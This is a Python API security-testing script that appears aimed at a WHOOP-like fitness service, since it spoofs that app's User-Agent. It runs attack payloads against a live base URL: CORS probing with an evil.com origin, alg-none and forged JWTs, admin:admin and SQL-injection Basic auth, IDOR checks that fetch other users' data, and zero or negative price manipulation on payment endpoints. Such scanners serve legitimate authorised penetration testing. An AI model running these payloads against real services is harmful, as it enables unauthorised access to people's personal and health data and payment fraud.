#!/usr/bin/env python3

import requests
import json
import sys
from datetime import datetime
import argparse
from urllib.parse import urljoin
import time
import uuid
import base64

class APITester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'WHOOP/5.0.0 (iPhone; iOS 17.0; Scale/3.00)',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })

    def test_cors(self, endpoint):
        try:
            headers = {
                'Origin': 'https://evil.com',
                'Access-Control-Request-Method': 'GET,POST,PUT,DELETE',
                'Access-Control-Request-Headers': 'Authorization,Content-Type'
            }
            
            resp = self.session.options(urljoin(self.base_url, endpoint), headers=headers)
            
            if 'Access-Control-Allow-Origin' in resp.headers:
                if resp.headers['Access-Control-Allow-Origin'] == '*' or 'evil.com' in resp.headers['Access-Control-Allow-Origin']:
                    self.results.append({
                        'type': 'cors_misconfiguration',
                        'endpoint': endpoint,
                        'severity': 'Medium',
                        'details': 'Potentially dangerous CORS configuration allows requests from any origin',
                        'headers': dict(resp.headers)
                    })
        except Exception as e:
            pass

    def test_graphql_introspection(self, endpoint):
        if 'graphql' not in endpoint.lower():
            return

        introspection_query = {
            'query': '''
                query IntrospectionQuery {
                    __schema {
                        types {
                            name
                            fields {
                                name
                            }
                        }
                    }
                }
            '''
        }

        try:
            resp = self.session.post(
                urljoin(self.base_url, endpoint),
                json=introspection_query,
                headers={'Content-Type': 'application/json'}
            )
            
            if resp.status_code == 200 and '__schema' in resp.text:
                self.results.append({
                    'type': 'graphql_introspection',
                    'endpoint': endpoint,
                    'severity': 'Medium',
                    'details': 'GraphQL introspection is enabled, exposing schema information',
                    'response': resp.text[:500]  # First 500 chars only
                })
        except Exception as e:
            pass

    def test_method_enumeration(self, endpoint):
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        
        for method in methods:
            try:
                resp = self.session.request(method, urljoin(self.base_url, endpoint))
                if resp.status_code != 404:
                    self.results.append({
                        'type': 'method_allowed',
                        'endpoint': endpoint,
                        'method': method,
                        'status_code': resp.status_code,
                        'severity': 'Info'
                    })
            except Exception as e:
                pass

    def test_auth_bypass(self, endpoint):
        # Test without auth
        try:
            resp = self.session.get(urljoin(self.base_url, endpoint))
            if resp.status_code == 200:
                self.results.append({
                    'type': 'potential_auth_bypass',
                    'endpoint': endpoint,
                    'severity': 'High',
                    'details': 'Endpoint accessible without authentication'
                })
        except Exception as e:
            pass

        # Test with various auth bypass attempts
        auth_headers = [
            {'Authorization': 'null'},
            {'Authorization': 'undefined'},
            {'Authorization': 'Bearer null'},
            {'Authorization': 'Bearer undefined'},
            {'Authorization': 'Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.'},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='}  # admin:admin in base64
        ]

        for headers in auth_headers:
            try:
                resp = self.session.get(urljoin(self.base_url, endpoint), headers=headers)
                if resp.status_code == 200:
                    self.results.append({
                        'type': 'potential_auth_bypass',
                        'endpoint': endpoint,
                        'severity': 'High',
                        'details': f'Endpoint accessible with invalid auth: {headers}'
                    })
            except Exception as e:
                pass

    def test_rate_limiting(self, endpoint):
        try:
            # Make 10 rapid requests
            start_time = time.time()
            responses = []
            for _ in range(10):
                resp = self.session.get(urljoin(self.base_url, endpoint))
                responses.append(resp.status_code)
                
            end_time = time.time()
            time_diff = end_time - start_time
            
            # Check if we got all 200s and requests were too fast
            if all(r == 200 for r in responses) and time_diff < 2:
                self.results.append({
                    'type': 'missing_rate_limit',
                    'endpoint': endpoint,
                    'severity': 'Medium',
                    'details': f'No rate limiting detected: {len(responses)} requests in {time_diff:.2f} seconds'
                })
        except Exception as e:
            pass

    def test_idor(self, endpoint):
        """Test for Insecure Direct Object Reference with actual data access"""
        if not any(x in endpoint for x in ['/user/', '/data/', '/device/']):
            return

        # Try to access different user's data
        test_ids = ['12345', '54321', 'null', '0', '-1', 'undefined']
        for user_id in test_ids:
            try:
                # Test both query param and path manipulation
                urls = [
                    f"{urljoin(self.base_url, endpoint)}?user_id={user_id}",
                    f"{urljoin(self.base_url, endpoint)}?userId={user_id}",
                    f"{urljoin(self.base_url, endpoint.replace('profile', user_id))}",
                ]
                
                for url in urls:
                    resp = self.session.get(url)
                    if resp.status_code == 200 and self._contains_sensitive_data(resp.text):
                        self.results.append({
                            'type': 'idor_vulnerability',
                            'endpoint': url,
                            'severity': 'High',
                            'details': f'Potential IDOR: Accessed data with user_id {user_id}',
                            'proof': self._sanitize_response(resp.text)
                        })
            except Exception as e:
                pass

    def test_broken_auth(self, endpoint):
        """Test for authentication bypasses with actual impact"""
        if 'auth' not in endpoint and 'login' not in endpoint:
            return

        auth_tests = [
            # JWT token with none algorithm
            {'Authorization': 'Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.'},
            # SQL injection in Basic Auth
            {'Authorization': 'Basic ' + base64.b64encode(b'admin\' OR \'1\'=\'1').decode()},
            # Empty token
            {'Authorization': 'Bearer '},
            # Manipulated JWT with common secret
            {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.KmQPJxHeCX1nZA1QaIZKw8vhB2LEn5CSLzuKATEBtK4'}
        ]

        for headers in auth_tests:
            try:
                resp = self.session.post(
                    urljoin(self.base_url, endpoint),
                    headers=headers,
                    json={"email": "test@example.com", "password": "test123"}
                )
                
                if resp.status_code == 200 and self._contains_sensitive_data(resp.text):
                    self.results.append({
                        'type': 'auth_bypass',
                        'endpoint': endpoint,
                        'severity': 'Critical',
                        'details': f'Authentication bypass successful with {headers}',
                        'proof': self._sanitize_response(resp.text)
                    })
            except Exception as e:
                pass

    def test_business_logic(self, endpoint):
        """Test for business logic flaws with financial impact"""
        if any(x in endpoint for x in ['/payment/', '/subscription/', '/order/']):
            try:
                # Test price manipulation
                payloads = [
                    {"amount": 0},
                    {"amount": -1},
                    {"amount": "0"},
                    {"price": 0},
                    {"price": "0.0"},
                    {"total": 0}
                ]
                
                for payload in payloads:
                    resp = self.session.post(
                        urljoin(self.base_url, endpoint),
                        json=payload
                    )
                    
                    if resp.status_code == 200 and self._contains_success_indicators(resp.text):
                        self.results.append({
                            'type': 'business_logic_flaw',
                            'endpoint': endpoint,
                            'severity': 'High',
                            'details': f'Potential price manipulation with payload: {payload}',
                            'proof': self._sanitize_response(resp.text)
                        })
            except Exception as e:
                pass

    def _contains_sensitive_data(self, response):
        """Check if response contains actual sensitive data"""
        indicators = [
            '"email":', 
            '"phone":', 
            '"address":', 
            '"payment":', 
            '"credit_card":', 
            '"ssn":', 
            '"dob":',
            '"health_data":',
            '"activity_data":'
        ]
        return any(indicator in response.lower() for indicator in indicators)

    def _contains_success_indicators(self, response):
        """Check if response indicates successful transaction"""
        indicators = [
            '"success":', 
            '"status":"success"', 
            '"transaction_id":', 
            '"order_id":'
        ]
        return any(indicator in response.lower() for indicator in indicators)

    def _sanitize_response(self, response):
        """Remove sensitive data from response before logging"""
        try:
            data = json.loads(response)
            # Remove sensitive fields but keep structure
            for key in data.keys():
                if isinstance(data[key], str) and len(data[key]) > 20:
                    data[key] = f"{data[key][:10]}..."
            return json.dumps(data)
        except:
            return response[:100] + "..."

    def run_tests(self, endpoints):
        for endpoint in endpoints:
            print(f"Testing endpoint: {endpoint}")
            self.test_cors(endpoint)
            self.test_method_enumeration(endpoint)
            self.test_auth_bypass(endpoint)
            self.test_rate_limiting(endpoint)
            self.test_graphql_introspection(endpoint)
            self.test_idor(endpoint)
            self.test_broken_auth(endpoint)
            self.test_business_logic(endpoint)
            time.sleep(1)  # Be nice to the server
        
        return self.results

def main():
    parser = argparse.ArgumentParser(description='Enhanced API Security Tester')
    parser.add_argument('-u', '--base-url', required=True, help='Base URL to test')
    parser.add_argument('-e', '--endpoints', required=True, help='File containing endpoints to test')
    parser.add_argument('-o', '--output', help='Output file for results', default='api_test_results.json')
    args = parser.parse_args()

    with open(args.endpoints) as f:
        endpoints = [line.strip() for line in f.readlines()]

    tester = APITester(args.base_url)
    results = tester.run_tests(endpoints)

    with open(args.output, 'w') as f:
        json.dump(results, f, indent=4)

if __name__ == '__main__':
    main() 